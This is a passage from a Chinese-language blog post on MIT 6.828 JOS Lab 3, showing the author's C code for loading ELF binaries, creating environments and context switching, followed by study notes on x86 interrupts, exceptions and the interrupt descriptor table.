class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">load_icode</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *e, <span class="hljs-type">uint8_t</span> *binary)</span><br>&#123;<br><span class="hljs-comment">// Hints:</span><br><span class="hljs-comment">//  Load each program segment into virtual memory</span><br><span class="hljs-comment">//  at the address specified in the ELF segment header.</span><br><span class="hljs-comment">//  You should only load segments with ph-&gt;p_type == ELF_PROG_LOAD.</span><br><span class="hljs-comment">//  Each segment&#x27;s virtual address can be found in ph-&gt;p_va</span><br><span class="hljs-comment">//  and its size in memory can be found in ph-&gt;p_memsz.</span><br><span class="hljs-comment">//  The ph-&gt;p_filesz bytes from the ELF binary, starting at</span><br><span class="hljs-comment">//  &#x27;binary + ph-&gt;p_offset&#x27;, should be copied to virtual address</span><br><span class="hljs-comment">//  ph-&gt;p_va.  Any remaining memory bytes should be cleared to zero.</span><br><span class="hljs-comment">//  (The ELF header should have ph-&gt;p_filesz &lt;= ph-&gt;p_memsz.)</span><br><span class="hljs-comment">//  Use functions from the previous lab to allocate and map pages.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//  All page protection bits should be user read/write for now.</span><br><span class="hljs-comment">//  ELF segments are not necessarily page-aligned, but you can</span><br><span class="hljs-comment">//  assume for this function that no two segments will touch</span><br><span class="hljs-comment">//  the same virtual page.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//  You may find a function like region_alloc useful.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//  Loading the segments is much simpler if you can move data</span><br><span class="hljs-comment">//  directly into the virtual addresses stored in the ELF binary.</span><br><span class="hljs-comment">//  So which page directory should be in force during</span><br><span class="hljs-comment">//  this function?</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//  You must also do something with the program&#x27;s entry point,</span><br><span class="hljs-comment">//  to make sure that the environment starts executing there.</span><br><span class="hljs-comment">//  What?  (See env_run() and env_pop_tf() below.)</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Elf</span> *<span class="hljs-title">elfhdr</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Proghdr</span> *<span class="hljs-title">ph</span>, *<span class="hljs-title">eph</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">ustack</span>;</span><br><br><span class="hljs-comment">// check ELF magic</span><br>elfhdr = (<span class="hljs-keyword">struct</span> Elf*) binary;<br><span class="hljs-keyword">if</span> (elfhdr-&gt;e_magic != ELF_MAGIC)<br>panic(<span class="hljs-string">&quot;Invalid ELF header!&quot;</span>);<br><br><span class="hljs-comment">// switch to user pgdir</span><br>lcr3(PADDR(e-&gt;env_pgdir));<br><br><span class="hljs-comment">// analyze the header table and copy data</span><br>ph = (<span class="hljs-keyword">struct</span> Proghdr *) (binary + elfhdr-&gt;e_phoff);<br>eph = ph + elfhdr-&gt;e_phnum;<br><span class="hljs-keyword">for</span> (; ph &lt; eph; ph++)<br>&#123;<br><span class="hljs-keyword">if</span> (ph-&gt;p_type != ELF_PROG_LOAD)<br><span class="hljs-keyword">continue</span>;<br><br>region_alloc(e, (<span class="hljs-type">void</span>*)ph-&gt;p_va, ph-&gt;p_memsz);<br><span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span>*)(ph-&gt;p_va), <span class="hljs-number">0</span>, ph-&gt;p_memsz);<br><span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span>*)(ph-&gt;p_va), (<span class="hljs-type">void</span>*)(binary + ph-&gt;p_offset), ph-&gt;p_filesz);<br>&#125;<br><br><span class="hljs-comment">// set the entry point</span><br>e-&gt;env_tf.tf_eip = elfhdr-&gt;e_entry;<br><br><span class="hljs-comment">// Now map one page for the program&#x27;s initial stack</span><br><span class="hljs-comment">// at virtual address USTACKTOP - PGSIZE.</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br>region_alloc(e, (<span class="hljs-type">void</span>*)(USTACKTOP - PGSIZE), PGSIZE);<br>ustack = page_lookup(e-&gt;env_pgdir, (<span class="hljs-type">void</span>*)(USTACKTOP - PGSIZE), <span class="hljs-literal">NULL</span>);<br>page_insert(kern_pgdir, ustack, (<span class="hljs-type">void</span>*)(USTACKTOP - PGSIZE), PTE_U | PTE_W);<br><br><span class="hljs-comment">// recover kernel pgdir</span><br>lcr3(PADDR(kern_pgdir));<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="env-create-：创建进程环境"><a href="#env-create-：创建进程环境" class="headerlink" title="env_create()：创建进程环境"></a>env_create()：创建进程环境</h4><p>调用 <code>env_alloc()</code> 分配 PCB、调用 <code>load_icode()</code> 解析载入 ELF 即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Allocates a new env with env_alloc, loads the named elf</span><br><span class="hljs-comment">// binary into it with load_icode, and sets its env_type.</span><br><span class="hljs-comment">// This function is ONLY called during kernel initialization,</span><br><span class="hljs-comment">// before running the first user-mode environment.</span><br><span class="hljs-comment">// The new env&#x27;s parent ID is set to 0.</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">env_create</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> *binary, <span class="hljs-keyword">enum</span> EnvType type)</span><br>&#123;<br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">new_env</span>;</span><br><span class="hljs-keyword">switch</span>(env_alloc(&amp;new_env, <span class="hljs-number">0</span>))<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<span class="hljs-comment">// success</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> -E_NO_FREE_ENV:<br>panic(<span class="hljs-string">&quot;No free Env now!&quot;</span>);<br><span class="hljs-keyword">case</span> -E_NO_MEM:<br>panic(<span class="hljs-string">&quot;OOM while alloc the Env!&quot;</span>);<br><span class="hljs-keyword">default</span>:<br>panic(<span class="hljs-string">&quot;unknown fault from env_alloc!&quot;</span>);<br>&#125;<br><br>new_env-&gt;env_type = type;<br>load_icode(new_env, binary);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="env-run-：将进程加入运行队列"><a href="#env-run-：将进程加入运行队列" class="headerlink" title="env_run()：将进程加入运行队列"></a>env_run()：将进程加入运行队列</h4><p>分为三步走：</p><ul><li>若当前有进程在运行（curenv !&#x3D; NULL)，将其状态设为 <code>ENV_RUNNABLE</code></li><li>将 curenv 设为待运行进程的 Env并改变其状态、增加运行次数计数，切换到用户页表</li><li>恢复用户进程运行上下文，从内核态切换到用户态</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Context switch from curenv to env e.</span><br><span class="hljs-comment">// Note: if this is the first call to env_run, curenv is NULL.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This function does not return.</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">env_run</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *e)</span><br>&#123;<br><span class="hljs-comment">// Step 1: If this is a context switch (a new environment is running):</span><br><span class="hljs-comment">//   1. Set the current environment (if any) back to</span><br><span class="hljs-comment">//      ENV_RUNNABLE if it is ENV_RUNNING (think about</span><br><span class="hljs-comment">//      what other states it can be in),</span><br><span class="hljs-comment">//   2. Set &#x27;curenv&#x27; to the new environment,</span><br><span class="hljs-comment">//   3. Set its status to ENV_RUNNING,</span><br><span class="hljs-comment">//   4. Update its &#x27;env_runs&#x27; counter,</span><br><span class="hljs-comment">//   5. Use lcr3() to switch to its address space.</span><br><span class="hljs-comment">// Step 2: Use env_pop_tf() to restore the environment&#x27;s</span><br><span class="hljs-comment">//   registers and drop into user mode in the</span><br><span class="hljs-comment">//   environment.</span><br><br><span class="hljs-comment">// Hint: This function loads the new environment&#x27;s state from</span><br><span class="hljs-comment">//e-&gt;env_tf.  Go back through the code you wrote above</span><br><span class="hljs-comment">//and make sure you have set the relevant parts of</span><br><span class="hljs-comment">//e-&gt;env_tf to sensible values.</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-keyword">if</span> (curenv)<br>&#123;<br><span class="hljs-keyword">switch</span> (curenv-&gt;env_status)<br>&#123;<br><span class="hljs-keyword">case</span> ENV_RUNNING:<br><span class="hljs-keyword">case</span> ENV_RUNNABLE:<br><span class="hljs-keyword">case</span> ENV_NOT_RUNNABLE:<br>curenv-&gt;env_status = ENV_RUNNABLE;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> ENV_FREE:<br>panic(<span class="hljs-string">&quot;running a free Env!&quot;</span>);<br><span class="hljs-keyword">case</span> ENV_DYING:<br>panic(<span class="hljs-string">&quot;running a dying Env!&quot;</span>);<br><span class="hljs-keyword">default</span>:<br>panic(<span class="hljs-string">&quot;The env is crashed!&quot;</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// set the curenv</span><br>curenv = e;<br>curenv-&gt;env_status = ENV_RUNNING;<br>curenv-&gt;env_runs++;<br><br><span class="hljs-comment">// recover the context of process and ret2usr</span><br>lcr3(PADDR(curenv-&gt;env_pgdir));<br>env_pop_tf(&amp;curenv-&gt;env_tf);<br><br><span class="hljs-comment">// we never arrive there</span><br>panic(<span class="hljs-string">&quot;env_run not yet implemented&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>完成这一切后，我们来跑一下这份代码，<strong>你会发现内核成功地运行了程序 hello，并在其尝试调用 0x30号中断时 触发了 triple fault 导致运行暂停</strong></p><p><img src="https://s2.loli.net/2022/03/17/5E9QxkMsrFnKoOq.png" alt="image.png"></p><p>那为什么会触发 triple fault 呢？如同 32位 Linux kernel 所做的一般，JOS 也将系统调用实现为一个中断，这便是第一个 fault（需要注意 fault 并非都代表错误，很多机制其实是通过这种“fault”的触发而实现的）；而由于 JOS 尚未设置中断处理程序，因此 CPU 会生成一个 general protection exception，这便是 double fault；然后 CPU 又要处理生成的这个 exception，但是没有对应的处理程序（套娃了），于是就 triple fault 了，但是这并不会无限嵌套下去，在 triple fault 的时候系统就完全无法运行了，通常情况下就重启了，因为我们是 patched qemu 所以会被 qemu 挂起</p><h3 id="Handling-Interrupts-and-Exceptions"><a href="#Handling-Interrupts-and-Exceptions" class="headerlink" title="Handling Interrupts and Exceptions"></a>Handling Interrupts and Exceptions</h3><p>因此接下来我们来实现中断处理与异常处理，首先是 Exercise 3，阅读了解中断与异常相关基础知识</p><blockquote><p><strong>Exercise 3.</strong> Read <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/c09.htm">Chapter 9, Exceptions and Interrupts</a> in the <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/toc.htm">80386 Programmer’s Manual</a> (or Chapter 5 of the <a href="https://pdos.csail.mit.edu/6.828/2018/readings/ia32/IA32-3A.pdf">IA-32 Developer’s Manual</a>), if you haven’t already.</p></blockquote><p><strong>中断</strong>（interrupt）与<strong>异常</strong>（exception）是两种特别的改变控制流的方式，其工作原理类似于非编程式的 <code>call</code> 指令——改变正常的程序流程以处理外部事件或报告错误与异常情况</p><p>中断与异常的区别在于中断用以处理处理器外的异步事件，而异常则是处理器在运行时检测到异常事件后的处理</p><p>中断与异常通常有如下来源：</p><ul><li>中断：<ul><li>可屏蔽中断，通过 INTR 引脚发出</li><li>不可屏蔽中断，通过 NMI 引脚发出</li></ul></li><li>异常：<ul><li>由处理器检测到的，具体可分为 faults、traps 与 aborts</li><li>编程式的，通过指令 into、int 3、int n、bound 可触发异常，通常称之为“软中断”，但处理器将其作为异常来处理</li></ul></li></ul><h4 id="Identify-Interrupts"><a href="#Identify-Interrupts" class="headerlink" title="Identify Interrupts"></a>Identify Interrupts</h4><p>处理器将不同的中断与异常进行独立标号，其中 NMI 与异常对应标号 0 ~ 31（并非所有标号都有对应用途，部分标号为未来保留）；可屏蔽中断的标识符由外部中断控制器（例如 Intel 8259A 的可编程中断控制器（Programmable Interrupt Controller））确定，并在处理器的中断确认序列中与处理器通信，8259A 的 PIC 分配的标号可以由软件指定，范围为 32 ~ 255</p><p>根据异常报告的方式与是否支持重启指令将其分为三类：</p><ul><li><p>Faults：在“指令造成异常前”被报告的异常，可以是在指令开始执行时或是执行过程中被检测到，若在执行指令时检测到异常，则会保存当前上下文，完成异常处理后再恢复上下文，<strong>重新从造成异常的指令开始执行</strong></p><blockquote><p>举个🌰：Linux 中的 page fault 就是这样的一种异常，当读写尚未分配内存页的地址时（比如说 mmap 分配了一个 vma 但是还没分配物理页框）便会触发缺页异常处理程序，分配内存页后再重新从读写的指令开始运行</p></blockquote></li><li><p>Traps：在检测到异常的指令后立即在指令边界报告的异常（<del>别问，👴也没看懂英文原文啥意思</del>）</p><blockquote><p>举个🌰：系统调用的流程简化后类似于一个陷阱，用户态进程布置好数据后通过指令陷入到内核态，内核完成处理后再返回用户态，执行下一条指令</p></blockquote></li><li><p>Aborts：是一种既不精确定位指令也不重启程序的异常，通常用来报告<strong>严重的错误</strong>（例如硬件错误或非法值）</p><blockquote><p>例如除以 0 可能就是一种 Abort？</p></blockquote></li></ul><p>下表显示了中断与异常对应类型的标识符</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs smali">Table 9-1. Interrupt<span class="hljs-built_in"> and </span>Exception ID Assignments<br><br>Identifier   Description<br><br>0            Divide error<br>1            Debug exceptions<br>2            Nonmaskable interrupt<br>3            Breakpoint (one-byte INT 3 instruction)<br>4            Overflow (INTO instruction)<br>5            Bounds<span class="hljs-built_in"> check </span>(BOUND instruction)<br>6            Invalid opcode<br>7            Coprocessor<span class="hljs-built_in"> not </span>available<br>8            Double fault<br>9            (reserved)<br>10           Invalid TSS<br>11           Segment<span class="hljs-built_in"> not </span>present<br>12           Stack exception<br>13           General protection<br>14           Page fault<br>15           (reserved)<br>16           Coprecessor error<br>17-31        (reserved)<br>32-255       Available for external interrupts via INTR pin<br></code></pre></td></tr></table></figure><h4 id="Enabling-and-Disabling-Interrupts"><a href="#Enabling-and-Disabling-Interrupts" class="headerlink" title="Enabling and Disabling Interrupts"></a>Enabling and Disabling Interrupts</h4><p>若多个中断同时发生，我们不应当在处理一个中断时跑去处理另一个中断，因此需要明确什么时候能进行中断处理</p><p>对于不可屏蔽中断而言，处理器在执行到 iret 指令之前都会忽略 NMI 引脚上的中断信号</p><p>对于可屏蔽中断而言，当 IF 标志位为 0 时中断被关闭，只有在 IF &#x3D;&#x3D; 1时才能进行，与其他标志位一样，在处理器重置时 IF 会被清空，我们可以通过 <code>cli</code> 与 <code>sli</code> 指令清空或设置 IF 标志位，这两个指令只有在 CLI （特权级）&lt;&#x3D; IOPL 时才可用，否则会触发保护异常</p><p>IF 标志位还会被这些操作影响：</p><ul><li><code>pushf</code> 指令将 eflags 寄存器的值推到栈上</li><li>在任务切换时会调用 <code>popf</code> 与 <code>iret</code> 指令载入标志位寄存器</li><li>在通过中断门时会自动重置 IF 标志位，关闭中断</li></ul><p>RF 标志位用以控制 debug fault，对于给定指令其最多会被触发一次</p><p>对 ss 寄存器的更改（mov 或 pop）也会影响一些中断与异常，例如我们改变堆栈（<code>ss:esp</code>）的过程中（刚好改了 ss 没改 esp）处理了中断或异常，则堆栈指针在中断&#x2F;异常处理的过程中是不一致的，因此 80386 在更改 ss 的指令后的指令边界处禁止 NMI、INTR、debug fault 或单步陷阱，可能会有例外：page fault 或 general protection fault，因此我们需要使用 80386 的 <code>lss</code> 指令</p><h4 id="Priority-Among-Simultaneous-Interrupts-and-Exceptions"><a href="#Priority-Among-Simultaneous-Interrupts-and-Exceptions" class="headerlink" title="Priority Among Simultaneous Interrupts and Exceptions"></a>Priority Among Simultaneous Interrupts and Exceptions</h4><p>中断与异常的处理同样有着优先级，处理器会先处理高优先级的异常而丢弃低优先级的异常，当中断处理返回时会发现被丢弃的异常并重新处理；优先级顺序如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Table</span> <span class="hljs-number">9</span><span class="hljs-number">-2.</span> Priority Among Simultaneous Interrupts <span class="hljs-keyword">and</span> Exceptions<br><br>Priority   <span class="hljs-keyword">Class</span> <span class="hljs-keyword">of</span> Interrupt <span class="hljs-keyword">or</span> <span class="hljs-keyword">Exception</span><br><br>HIGHEST    Faults <span class="hljs-keyword">except</span> <span class="hljs-keyword">debug</span> faults<br>Trap instructions <span class="hljs-keyword">INTO</span>, <span class="hljs-type">INT</span> n, <span class="hljs-type">INT</span> <span class="hljs-number">3</span><br><span class="hljs-keyword">Debug</span> traps <span class="hljs-keyword">for</span> this instruction<br><span class="hljs-keyword">Debug</span> faults <span class="hljs-keyword">for</span> next instruction<br>NMI interrupt<br>LOWEST     INTR interrupt<br></code></pre></td></tr></table></figure><h4 id="Interrupt-Descriptor-Table"><a href="#Interrupt-Descriptor-Table" class="headerlink" title="Interrupt Descriptor Table"></a>Interrupt Descriptor Table</h4><p>类似于段描述符表，中断同样有着对应的<strong>门描述符</strong>（Gate Descriptor）结构与一张<strong>中断描述符表</strong>（Interrupt Descriptor Table），不同于 GDT 与 LDT，IDT 的第一个描述符是可用的，因为中断与异常一共有着 256 个标号，因此一张中断描述符表上最多可以有 256 个中断描述符（也可以少于这个数量）</p><p>中断描述符表的地址存放在 IDT 寄存器（IDTR）中，我们可以通过 <code>lidt</code> 指令（通过线性地址装载 IDT，只能在 0 特权级下执行）与 <code>sidt</code> 指令（拷贝当前 IDTR 的值，可以在任何特权级下执行）操作 IDTR</p><p>中断描述符表的结构如下：</p><p><img src="https://s2.loli.net/2022/03/17/vPQKmeGVhyJ3ADT.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/17/5WujsrOYPpkMIze.png" alt="image.png"></p><h4 id="IDT-Descriptor"><a href="#IDT-Descriptor" class="headerlink" title="IDT Descriptor"></a>IDT Descriptor</h4><p>中断描述符表中包含如下三种描述符：</p><ul><li>任务门（用作任务切换，后面可能会讲到）</li><li>中断门</li><li>陷阱门</li></ul><p>描述符的结构如下所示</p><p><img src="https://s2.loli.net/2022/03/17/Q3GiDPscdyKmLIT.png" alt="image.png"></p><h4 id="Interrupt-Procedures"><a href="#Interrupt-Procedures" class="headerlink" title="Interrupt Procedures"></a>Interrupt Procedures</h4><p>如同 call 指令一般，中断与异常其实就是“call”中断处理程序——处理器通过中断或异常标号作为 IDT 的索引找到对应的中断描述符，若是一个中断门或陷阱门则其会以类似“call”调用门的方式调用处理程序，若是一个任务门，则会以类似“call”任务门的方式引起任务切换</p><p>中断门与陷阱门并不直接指向处理程序，而是通过下图的方式找到处理程序地址：门的选择子指向一个 GDT&#x2F;LDT 中的可执行段，门的 offset 域指向中断&#x2F;异常处理程序的开头</p><p><img src="https://s2.loli.net/2022/03/17/yoAXZpNmQDS3Vvr.png" alt="image.png"></p><p>如同 call 指令引起的控制流转移一般，中断与异常的处理过程同样使用堆栈存储返回原始过程所需的信息，并使用 iret 指令从栈上恢复这些信息，如同下图所示：</p><p><img src="https://s2.loli.net/2022/03/17/qWnwvs9NreXpuiD.png" alt="image.png"></p><p>在通过中断门或陷阱门后会将 eflags 存到栈上，并重置 TF （trap flag）标志位，以此防止单步执行的调试过程影响中断响应，完成后 iret 指令会从栈上恢复 eflags，需要注意的是通过中断门后会重置 IF ，但通过陷阱门并不会重置 IF</p><p>在中断过程中 CPU 不允许将控制权转移到低于当前特权级的段上，否则会触发 general protection fault，因此我们可以通过任一下列策略防止这种情况的发生：</p><ul><li>将处理程序放在合适的段中，这样的策略适合一些特殊的异常处理程序（例如 divided by zero），这样的处理程序必须仅使用堆栈中的可用数据，若其需要来自数据段的数据，则需要确保数据段的特权级为 3，从而使其不受访问保护</li><li>将处理程序放在特权级 0 的段中</li></ul><h4 id="Interrupt-Tasks"><a href="#Interrupt-Tasks" class="headerlink" title="Interrupt Tasks"></a>Interrupt Tasks</h4><p>IDT 中的任务门并不直接指向一个任务，如同下图所示，门的选择子指向 GDT 中的一个 TSS 描述符，当中断或异常触发通过任务门时，将会进行任务的切换</p><p><img src="https://s2.loli.net/2022/03/17/GZBLwKDji6f7gdC.png" alt="image.png"></p><p>使用一个独立的任务来处理中断有如下优点：</p><ul><li>会自动保存进程上下文</li><li>中断处理程序可以通过一个单独的地址空间与其他任务独立开来，比如通过一个 LDT 或 独立页表</li></ul><p>任务的切换参见 <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/c07.htm">Chapter 7</a>.，需要说明的是中断任务同样通过 iret 指令返回原进程；若是任务切换是由一个带着错误代码的异常引起的，则处理器会自动将错误代码存到处理程序的栈上</p><p>在 80386 中使用中断任务时，实际上有两个调度器：软件调度器（OS的一部分）与硬件调度器（处理器中断机制的一部分），软件调度器的设计应该考虑到硬件调度器可以在启用中断时调度中断任务这一事实</p><h4 id="Interrupt-Summary"><a href="#Interrupt-Summary" class="headerlink" title="Interrupt Summary"></a>Interrupt Summary</h4><p>下表总结了 386 所识别的异常：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Table</span> <span class="hljs-number">9</span><span class="hljs-number">-6.</span> <span class="hljs-keyword">Exception</span> <span class="hljs-keyword">Summary</span><br><br>Description               Interrupt   <span class="hljs-keyword">Return</span> Address  <span class="hljs-keyword">Exception</span>     <span class="hljs-keyword">Function</span> That Can Generate<br>Number      Points <span class="hljs-keyword">to</span>       <span class="hljs-keyword">Type</span>          the <span class="hljs-keyword">Exception</span><br>Faulting<br>Instruction<br><br>Divide error               <span class="hljs-number">0</span>          YES             FAULT         DIV, IDIV<br><span class="hljs-keyword">Debug</span> exceptions           <span class="hljs-number">1</span><br><span class="hljs-keyword">Some</span> <span class="hljs-keyword">debug</span> exceptions are traps <span class="hljs-keyword">and</span> <span class="hljs-keyword">some</span> are faults.  The <span class="hljs-keyword">exception</span><br><span class="hljs-keyword">handler</span> can determine which has occurred <span class="hljs-keyword">by</span> examining DR6.  (Refer <span class="hljs-keyword">to</span> Chapter <span class="hljs-number">12.</span>)<br><span class="hljs-keyword">Some</span> <span class="hljs-keyword">debug</span> exceptions are traps <span class="hljs-keyword">and</span> <span class="hljs-keyword">some</span> are faults.  The <span class="hljs-keyword">exception</span><br><span class="hljs-keyword">handler</span> can determine which has occurred <span class="hljs-keyword">by</span> examining DR6.  (Refer <span class="hljs-keyword">to</span> Chapter <span class="hljs-number">12.</span>) <span class="hljs-keyword">Any</span> instruction<br>Breakpoint                 <span class="hljs-number">3</span>          <span class="hljs-keyword">NO</span>              TRAP          One-byte <span class="hljs-type">INT</span> <span class="hljs-number">3</span><br>Overflow                   <span class="hljs-number">4</span>          <span class="hljs-keyword">NO</span>              TRAP          <span class="hljs-keyword">INTO</span><br>Bounds <span class="hljs-keyword">check</span>               <span class="hljs-number">5</span>          YES             FAULT         BOUND<br>Invalid opcode             <span class="hljs-number">6</span>          YES             FAULT         <span class="hljs-keyword">Any</span> illegal instruction<br>Coprocessor <span class="hljs-keyword">not</span> available  <span class="hljs-number">7</span>          YES             FAULT         ESC, WAIT<br><span class="hljs-type">Double</span> fault               <span class="hljs-number">8</span>          YES             <span class="hljs-keyword">ABORT</span>         <span class="hljs-keyword">Any</span> instruction that can<br>generate an <span class="hljs-keyword">exception</span><br>Coprocessor Segment<br>Overrun                    <span class="hljs-number">9</span>          <span class="hljs-keyword">NO</span>              <span class="hljs-keyword">ABORT</span>         <span class="hljs-keyword">Any</span> operand <span class="hljs-keyword">of</span> an ESC<br>instruction that wraps around<br>the <span class="hljs-keyword">end</span> <span class="hljs-keyword">of</span> a segment.<br>Invalid TSS               <span class="hljs-number">10</span>          YES             FAULT<br>An invalid-TSS fault <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> restartable <span class="hljs-keyword">if</span> it occurs during the<br>processing <span class="hljs-keyword">of</span> an <span class="hljs-keyword">external</span> interrupt.        JMP, <span class="hljs-keyword">CALL</span>, IRET, <span class="hljs-keyword">any</span> interrupt<br>Segment <span class="hljs-keyword">not</span> present       <span class="hljs-number">11</span>          YES             FAULT         <span class="hljs-keyword">Any</span> segment-register modifier<br>Stack <span class="hljs-keyword">exception</span>           <span class="hljs-number">12</span>          YES             FAULT         <span class="hljs-keyword">Any</span> memory reference thru SS<br>General Protection        <span class="hljs-number">13</span>          YES             FAULT/<span class="hljs-keyword">ABORT</span><br><span class="hljs-keyword">All</span> GP faults are restartable. <span class="hljs-keyword">If</span> the fault occurs <span class="hljs-keyword">while</span> attempting <span class="hljs-keyword">to</span><br>vector <span class="hljs-keyword">to</span> the <span class="hljs-keyword">handler</span> <span class="hljs-keyword">for</span> an <span class="hljs-keyword">external</span> interrupt, the interrupted program <span class="hljs-keyword">is</span><br>restartable, but the interrupt may be lost.  <span class="hljs-keyword">Any</span> memory reference <span class="hljs-keyword">or</span> code<br><span 